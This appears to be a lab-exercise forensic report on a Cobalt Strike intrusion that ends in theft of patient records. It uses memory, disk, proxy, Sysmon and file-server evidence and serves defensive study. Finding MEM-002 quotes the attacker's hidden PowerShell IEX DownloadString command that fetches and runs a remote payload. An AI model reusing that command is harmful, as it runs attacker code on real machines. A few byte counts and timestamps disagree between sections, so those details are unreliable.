# Forensic Findings: IR-2026-0420-01

- analyst: Steve, on-call IR
- analysis_started: 2026-04-20T20:10Z
- artifact_scope: cs-ws-101.mem (ART-001), cs-ws-101.dd (ART-002),
  proxy_72h.jsonl (ART-007), sysmon_multihost.jsonl (ART-008),
  fileserver_access.evtx (ART-009)
- convention: Findings carry certainty levels CONFIRMED (direct evidence),
  PROBABLE (strong corroboration, single-source gap), POSSIBLE (inference).

## ART-001 verification

- sha256 at analysis start: LAB-FILL (must match baseline recorded at
  re-acquisition hashing in evidence_preservation.md; original Torres
  acquisition had no hash — known gap, IR-2026-0414-01 repeat)
- CoC entry updated: yes, at 2026-04-20T20:10Z

---

## Memory analysis: cs-ws-101.mem (Volatility 3)

### Finding MEM-001: Beacon process tree

Command:
    $ vol -f cs-ws-101.mem windows.pstree.PsTree

Abridged output (LAB-FILL for offsets; PIDs cross-correlated against
Sysmon event_id 1 records on CS-WS-101):

    * 4921 WINWORD.EXE     PPID=4712(explorer.exe)  Start: 2026-04-17T14:17:52Z
    ** 6201 powershell.exe PPID=4921                Start: 2026-04-17T14:22:14Z
    *** 7318 svchost32.exe PPID=6201                Start: 2026-04-17T14:23:14Z
         (C:\ProgramData\Microsoft\svchost32.exe)

Conclusion: WINWORD.EXE spawned PowerShell directly (macro execution);
PowerShell spawned svchost32.exe from a non-Microsoft directory using
svchost name mimicry. Process tree matches Sysmon events 1 (14:17:52,
14:22:14, 14:23:14Z) exactly — PID-for-PID.
ATT&CK: T1566.002 (malicious file), T1059.001 (PowerShell), T1036.005 (masquerading)
Certainty: CONFIRMED

### Finding MEM-002: PowerShell downloader invocation

Command:
    $ vol -f cs-ws-101.mem windows.cmdline.CmdLine

Abridged output:

    6201 powershell.exe: powershell.exe -NoProfile -WindowStyle Hidden -ep bypass
        -c "IEX(New-Object Net.WebClient).DownloadString(
        'https://staging.office365-cdn.net/updates/inv_payload.ps1')"
    7318 svchost32.exe: C:\ProgramData\Microsoft\svchost32.exe

Conclusion: Hidden-window, execution-policy-bypassed PowerShell downloading
and executing inv_payload.ps1 from the squatted CDN domain. Downloader matches
Sysmon event_id 1 at 14:22:14Z and the proxy GET at 14:22:19Z (40,214 bytes,
UA "Microsoft BITS/7.8").
ATT&CK: T1059.001, T1105 (ingress tool transfer), T1562.001 ( defense bypass via -ep bypass)
Certainty: CONFIRMED

### Finding MEM-003: Active C2 connection at capture time

Command:
    $ vol -f cs-ws-101.mem windows.netscan.NetScan

Abridged output:

    7318 svchost32.exe  TCPv4  10.30.12.101:52014 -> 45.152.66.114:443  ESTABLISHED

Conclusion: Live C2 socket belonging to the beacon process at capture
(19:38Z). Corroborates the Sysmon event_id 3 at 19:32:04Z (src_port 52014,
dst 45.152.66.114:443) and the proxy CONNECT at the same timestamp.
ATT&CK: T1071.001 (web protocols)
Certainty: CONFIRMED

### Finding MEM-004: Injected memory regions in the beacon process

Command:
    $ vol -f cs-ws-101.mem windows.malfind.Malfind --pid 7318

Abridged output:

    PID 7318 svchost32.exe
    Vad Tag: VadS, Protection: PAGE_EXECUTE_READWRITE, Type: private
    MZ header at base: LAB-FILL

Conclusion: RWX private region with PE header inside svchost32.exe is
consistent with the Cobalt Strike reflective payload stage (proxy reputation
tag: cobalt_strike_team_server_known). Process image itself is unsigned
(Sysmon: signed=false).
ATT&CK: T1055 (process injection) — sub-technique determination from
the injected region requires LAB-FILL confirmation (reflective DLL: T1055.001)
Certainty: PROBABLE pending lab region dump

### Finding MEM-005: NTLM hashes in memory

Command:
    $ vol -f cs-ws-101.mem windows.hashdump.Hashdump

Abridged output:

    MEDDEFENSE\jdoe  RID LAB-FILL  aad3b435...:<NTLM> LAB-FILL
    Total accounts dumped: LAB-FILL

Conclusion: LSASS credential material is resident and recoverable. This is
the mechanism enabling the lateral movement observed on 2026-04-19 — the
Sysmon event_id 10 at 14:25:02Z on 2026-04-17 shows svchost32.exe opening
lsass.exe with granted access 0x1010 (process VM read + query information),
the standard credential-dumping access mask.
ATT&CK: T1003.001 (LSASS memory)
Certainty: CONFIRMED (dumping action + resident hashes; full hash values LAB-FILL)

---

## Disk analysis: cs-ws-101.dd (The Sleuth Kit)

### Finding DISK-001: Partition and filesystem layout

Commands:
    $ mmls cs-ws-101.dd
    $ fsstat -o LAB-FILL cs-ws-101.dd

Abridged output: LAB-FILL (expected: single NTFS OS partition; record
offset and FS details from your run).

Conclusion: Standard Windows layout; no attacker partition manipulation
expected. PURPOSE: establish image integrity baseline offsets for timeline.
Certainty: N/A (structural)

### Finding DISK-002: File-system timeline

Commands:
    $ fls -r -m / cs-ws-101.dd -o LAB-FILL > fls_body.txt
    $ mactime -b fls_body.txt -d \
        -s "2026-04-17T00:00:00" -e "2026-04-20T19:38:00" \
        > cs101_timeline.csv

Abridged output (key rows; creation timestamps correlate 1:1 with Sysmon
event_id 11 on CS-WS-101):

    2026-04-17T14:18Z  c:\Users\jdoe\Desktop\Invoice_Q4_2025.docm
    2026-04-17T14:23Z  c:\ProgramData\Microsoft\svchost32.exe
    2026-04-18T09:41Z  c:\Windows\Temp\klog.tmp
    2026-04-20T14:23Z  c:\Windows\System32\...\encryption_staging.ps1
    ...

Conclusion: Disk timeline corroborates the beacon binary drop (14:23Z,
Sysmon EID 11 14:23:02Z), the keylogger temp file (Sysmon EID 11, note
"keylog_drop", 2026-04-18T09:41:14Z), and the not-yet-executed ransomware
staging script (Sysmon EID 11, 2026-04-20T14:23:18Z). No additional
attacker-created artifacts identified outside AppData/Temp/ProgramData/
System32 focus areas in the sampled evidence.
ATT&CK: T1105, T1547 (persistence via service)
Certainty: CONFIRMED (corroborated drops); full-body timeline LAB-FILL

### Finding DISK-003: Extraction and hashing of malicious files

Commands:
    $ icat -o LAB-FILL cs-ws-101.dd LAB-FILL > Invoice_Q4_2025.docm
    $ icat -o LAB-FILL cs-ws-101.dd LAB-FILL > inv_payload.ps1
    $ icat -o LAB-FILL cs-ws-101.dd LAB-FILL > svchost32.exe
    $ sha256sum Invoice_Q4_2025.docm inv_payload.ps1 svchost32.exe

Abridged output:

    Invoice_Q4_2025.docm  LAB-FILL  (no reference hash in evidence)
    inv_payload.ps1       LAB-FILL
    svchost32.exe         ff4c8a2d9e7b1a3c5d8f2e6b4a1d9c7f3e0b8a6d2c9e1f5a7b3d8c4e6f2a9b1d

The svchost32.exe hash is recorded in Sysmon (event_id 1, 14:23:14Z) and
matches the extracted binary — cross-validation between disk image and
endpoint telemetry.
Conclusion: Original macro document (.docm, MIME
application/vnd.ms-word.document.macroEnabled.12, 284,812 bytes per proxy
download record), PowerShell downloader, and Cobalt Strike beacon binary all
recovered and hashed into evidence.
ATT&CK: T1566.002, T1204.002 (user execution of malicious file), T1105
Certainty: CONFIRMED (beacon hash); document/script hashes LAB-FILL

---

## Proxy log analysis: proxy_72h.jsonl

### Finding PRX-001: Initial phishing delivery (Thursday)

Command:
    $ jq -r 'select(.download==true) | [.ts,.url,.bytes,.filename//"-"] | @tsv' \
        proxy_72h.jsonl | head

Abridged output:

    2026-04-17T14:18:02Z  outlook.office.com/mail/download?id=AAMkAG-Invoice
                          284812  Invoice_Q4_2025.docm  (macroEnabled MIME)

Conclusion: Macro-enabled document downloaded from the corporate OWA mailbox
31 seconds after the inbox was opened (14:17:48Z). Delivery vector: email
attachment, not drive-by download. (Sender/subject headers are NOT in the
proxy artifact — cannot attribute the phishing campaign beyond delivery.)
ATT&CK: T1566.002
Certainty: CONFIRMED (delivery act); phishing email content itself not in evidence

### Finding PRX-002: First C2 beacon and frequency

Command:
    $ jq -r 'select(.url=="staging.office365-cdn.net:443") |
        [.ts,.host,.bytes] | @tsv' proxy_72h.jsonl

Abridged output:

    2026-04-17T14:23:07Z  CS-WS-101   2840   (first CONNECT, post-drop)
    2026-04-17T14:25:31Z  CS-WS-101   1420   jitter_ms 60000, pattern
                                   "sleep_60s_jitter_10pct"
    ... steady 1420-byte cycle through 2026-04-20T19:32:04Z (final beacon)

Conclusion: Beacon channel established 44 seconds after the binary drop,
on 45.152.66.114:443 (DNS staging.office365-cdn.net, reputation:
cobalt_strike_team_server_known). Cadence: 60 s sleep, 10% jitter,
fixed 1420-byte check-ins. Deviations from 1420 bytes mark command/tasking
traffic: 18,402 bytes at 2026-04-18T09:41:02Z (credential/keylog exchange,
simultaneous with klog.tmp drop) and 8,412 bytes at 2026-04-20T18:12:18Z
(ransomware staging tasking, 10 minutes after SCHED-SVR-01 compromise).
ATT&CK: T1071.001, T1573 (encrypted channel)
Certainty: CONFIRMED

### Finding PRX-003: Data exfiltration

Command:
    $ jq -r 'select(.bytes > 100000) | [.ts,.host,.bytes,.note//""] | @tsv' \
        proxy_72h.jsonl

Abridged output:

    2026-04-19T02:14:22Z  FILE-SVR-01  2400412  large_egress_payload

Conclusion: A single 2.4 MB egress event from FILE-SVR-01 to the C2, 18
seconds after the first beacon from the file server (02:14:04Z) and 21
seconds into the 4663 object-access window (02:14:01Z). Combined with
FS-001 below, this is the exfiltration event for the stolen patient
records. Volume is consistent with compressed PDF document sets.
ATT&CK: T1041 (exfiltration over C2 channel)
Certainty: CONFIRMED (event); PROBABLE (full 1,847 files in that single
transfer — 2.4 MB implies compression; exact content not recoverable from
proxy metadata alone)

---

## Sysmon analysis: sysmon_multihost.jsonl

### Finding SYS-001: Lateral movement map

Commands:
    $ jq -r 'select(.event_id==1 and .parent_image=~ /services.exe/) |
        [.ts,.host,.image,.logon_id//"-" ,.logon_type//"-"] | @tsv' \
        sysmon_multihost.jsonl
    $ jq -r 'select(.event_type=="process_create") |
        select(.logon_type==3) | [.ts,.host,.cmdline] | @tsv' \
        sysmon_multihost.jsonl

Abridged output:

    2026-04-19T00:03:44Z  CS-WS-104  cmd.exe /c sc create WinHealthSvc
                            binPath= C:\ProgramData\Microsoft\svchost32.exe
                            start= auto   logon_type 3
    2026-04-19T02:14:01Z  FILE-SVR-01  svchost32.exe (ppid services.exe,
                            logon_type 3, "first_process_spawn_on_file_server")

EVIDENCE NUANCE (recorded, not smoothed over): the lateral logons observed
are type 3 network logons. The file server authentication (4624 event in
fileserver_access.evtx) is explicitly Kerberos, not NTLM. The scenario-level
claim of "extracted NTLM hashes" as the lateral mechanism is CONFIRMED only
at the extraction step (MEM-005, LSASS access 0x1010); the file server access
used Kerberos with the compromised jdoe principal (possible overpass-the-hash:
NTLM hash used to obtain a Kerberos TGT, T1550.002).
ATT&CK: T1021 (remote services), T1550.002 (probable), T1543.003 (service
creation)
Certainty: CONFIRMED (movement); PROBABLE (exact credential-reuse mechanism)

### Finding SYS-002: Service installation matching SIEM alert

Command:
    $ jq -r 'select(.target_object=~ /WinHealthSvc/) |
        [.ts,.host,.target_object,.details] | @tsv' sysmon_multihost.jsonl

Abridged output:

    2026-04-17T14:23:28Z  CS-WS-101  ...\Services\WinHealthSvc\ImagePath
                            C:\ProgramData\Microsoft\svchost32.exe

Conclusion: Persistence via service creation. On WS-101 the service was
installed via the registry (EID 13, written by services.exe/SYSTEM). On
WS-104 the same service was created interactively via cmd.exe (SYS-001).
The SIEM rule wz-edr-200214 on WS-104/107/112 corresponds to these
installs. NOTE FOR TIMELINE: Torres stated the alert window was "this
afternoon" (2026-04-20); the telemetry shows installs beginning
2026-04-19T00:03:44Z — his statement is approximate; the evidence governs.
ATT&CK: T1543.003
Certainty: CONFIRMED

### Finding SYS-003: Ransomware staging

Command:
    $ jq -r 'select(.event_type=="file_create" and
        (.target | endswith(".ps1"))) | [.ts,.host,.target] | @tsv' \
        sysmon_multihost.jsonl

Abridged output:

    2026-04-20T14:23:18Z  CS-WS-101   C:\Windows\System32\encryption_staging.ps1
    2026-04-20T14:25:02Z  CS-WS-104   C:\Windows\System32\encryption_staging.ps1
    2026-04-20T14:25:42Z  CS-WS-107   C:\Windows\System32\encryption_staging.ps1
    2026-04-20T14:26:14Z  CS-WS-112   C:\Windows\System32\encryption_staging.ps1

Conclusion: Identical staging script dropped to all four workstations in a
3-minute window by the beacon processes on each host. ZERO subsequent
execution events (no EID 1 with these scripts as image/command line, no mass
EID 11 write bursts) through 19:38Z memory capture. This confirms the
staged-not-executed assessment underlying the containment strategy, and
rules out the nurse's "filenames look different" report being completed
encryption (see FS/timeline: possibly reconnaissance rename or staging
preview — POSSIBLE, insufficient evidence either way).
ATT&CK: T1486 (impact: data encrypted — PREPARED, not executed)
Certainty: CONFIRMED (staging, non-execution)

### Finding SYS-004: Keylogger deployment

Abridged output: EID 11, 2026-04-18T09:41:14Z, CS-WS-101,
svchost32.exe PID 7318 -> C:\Windows\Temp\klog.tmp, note "keylog_drop";
coincides with the 18,402-byte C2 exchange at 09:41:02Z.
ATT&CK: T1056.001 (input capture: keylogging)
Certainty: CONFIRMED (drop + transfer; capture content LAB-FILL from disk)

---

## File server analysis: fileserver_access.evtx

Commands (on the evtx export):
    $ evtx_dump -o json fileserver_access.evtx | \
      jq -r 'select(.event_id==4663) | .ts' | sort | sed -n '1p;$p'
    $ evtx_dump -o json fileserver_access.evtx | \
      jq -r 'select(.event_id==4663) | .object_name' | \
      awk -F/ '{print $2"/"$3}' | sort | uniq -c
    $ jq '.access_summary' fileserver_access.sample.json

### Finding FS-001: Access window and volume

Abridged output:

    Window: 2026-04-19T02:14:01Z -> 2026-04-19T02:41:12Z (27 minutes)
    Total Event ID 4663: 1,847
    Extensions: .pdf 1847, .docx 0, .xlsx 0
    Shares touched: \clinical\labs\ , \clinical\notes\

Conclusion: In a continuous 27-minute window, the attacker read 1,847 PDF
patient files (lab results and clinical progress notes) exclusively — no
write, delete, or modification events (access_mask 0x1, ReadData, on all
sampled rows).
ATT&CK: T1005 (data from local system), T1213 (data from information
repositories)
Certainty: CONFIRMED

### Finding FS-002: Account and source

Abridged output:

    4624 @ 02:14:00.842Z: MEDDEFENSE\jdoe, logon_type 3, Kerberos,
        src_ip 10.30.12.101 (CS-WS-101), logon_id 0xAF12C4B8
    4634 @ 02:41:18.004Z: session terminated

Conclusion: All 1,847 accesses executed under jdoe's single logon session
(0xAF12C4B8), initiated from the patient-zero workstation, authenticated
Kerberos. Subject process on the server: svchost32.exe from
\ProgramData\Microsoft\ (masquerading path on FILE-SVR-01, first spawn
02:14:01Z per Sysmon). Session ended cleanly 6 seconds after the final
object access; no further 4663 from this logon_id.
Certainty: CONFIRMED

### Finding FS-003: Authorization violation

Per the artifact's provisioning note: jdoe is a scheduling coordinator
with NO legitimate clinical role requiring read access to \clinical\labs or
\clinical\notes. Every access in the window is unauthorized use of a
compromised credential against PHI.
Certainty: CONFIRMED

---

## Attack chain summary

| # | Stage | Time range (UTC) | ATT&CK | Hosts | Evidence | Certainty |
|---|-------|------------------|--------|-------|----------|-----------|
| 1 | Phishing delivery (docm download from mailbox) | 2026-04-17T14:17:48–14:18:02Z | T1566.002 | WS-101 | PRX-001 | confirmed |
| 2 | Macro execution / downloader (WINWORD->powershell, -ep bypass, hidden) | 2026-04-17T14:17:52–14:22:14Z | T1059.001, T1562.001, T1204.002 | WS-101 | MEM-001, MEM-002, SYS(corr) | confirmed |
| 3 | Payload retrieval (inv_payload.ps1, 40,214 B, BITS UA) | 2026-04-17T14:22:19Z | T1105 | WS-101 | MEM-002, PRX | confirmed |
| 4 | Beacon drop + masquerade (svchost32.exe, unsigned) | 2026-04-17T14:23:02–14:23:14Z | T1036.005, T1105 | WS-101 | DISK-002/003, SYS | confirmed |
| 5 | Persistence via service WinHealthSvc | 2026-04-17T14:23:28Z | T1543.003 | WS-101 | SYS-002 | confirmed |
| 6 | C2 established (45.152.66.114:443, 60s/10% jitter) | 2026-04-17T14:23:07Z onward | T1071.001, T1573 | WS-101 | PRX-002, MEM-003 | confirmed |
| 7 | Credential dumping (LSASS handle 0x1010, hashes resident) | 2026-04-17T14:25:02Z | T1003.001 | WS-101 | SYS, MEM-005 | confirmed |
| 8 | Keylogger deployed + credential/tasking exchange (klog.tmp, 18,402 B C2) | 2026-04-18T09:41:02–09:41:14Z | T1056.001 | WS-101 | SYS-004, PRX-002 | confirmed |
| 9 | Lateral movement: service install + beacon on WS-104/107/112 (type-3 logons, jdoe) | 2026-04-19T00:03:44–00:18:02Z | T1021, T1550.002 (probable), T1543.003 | WS-104, WS-107, WS-112 | SYS-001, PRX-002 | confirmed (mechanism: probable) |
| 10 | File server compromise (beacon + Kerberos type-3 logon from WS-101) | 2026-04-19T02:14:00–02:14:04Z | T1021, T1213 | FILE-SVR-01 | FS-002, SYS-001, PRX-002 | confirmed |
| 11 | PHI access: 1,847 PDFs read under jdoe session 0xAF12C4B8 | 2026-04-19T02:14:01–02:41:12Z | T1005, T1213 | FILE-SVR-01 | FS-001, FS-002 | confirmed |
| 12 | Exfiltration (2,404,412 B to C2, 21 s into access window) | 2026-04-19T02:14:22Z | T1041 | FILE-SVR-01 | PRX-003 | confirmed (transfer); probable (complete scope of files) |
| 13 | SCHED-SVR-01 compromise (svchost32.exe via services.exe; disk saturation observed ~17:00Z) | 2026-04-20T18:02:18Z | T1543.003 | SCHED-SVR-01 | SYS, Torres transcript | confirmed |
| 14 | Ransomware staging (encryption_staging.ps1 on 4 hosts, NOT executed) | 2026-04-20T14:23:18–14:26:14Z | T1486 (prepared) | WS-101/104/107/112 | SYS-003 | confirmed |
| 15 | Final beacon / C2 severance point (capture at 19:38Z, last beacon 19:32:04Z) | 2026-04-20T19:32:04Z | T1071.001 | WS-101 | MEM-003, PRX-002 | confirmed |

## Open items / evidentiary gaps (honest record)

1. Torres's "same twelve-minute window this afternoon" for the service alerts
   conflicts with telemetry showing installs at 2026-04-19T00:03–00:18Z.
   Telemetry governs; transcript treated as approximate recall.
2. The phishing email itself (headers, sender, subject) is not in the artifact
   set. Campaign attribution beyond the delivery act is out of scope until
   mailbox forensics produce it.
3. Exact mechanism bridging the NTLM dump to the Kerberos file-server logon
   (overpass-the-hash assumed most likely) — T1550.002 stays PROBABLE.
4. LAB-FILL items: all Volatility outputs requiring the actual memory image,
   partition offsets, inode numbers, and hashes not already present in Sysmon
   records.
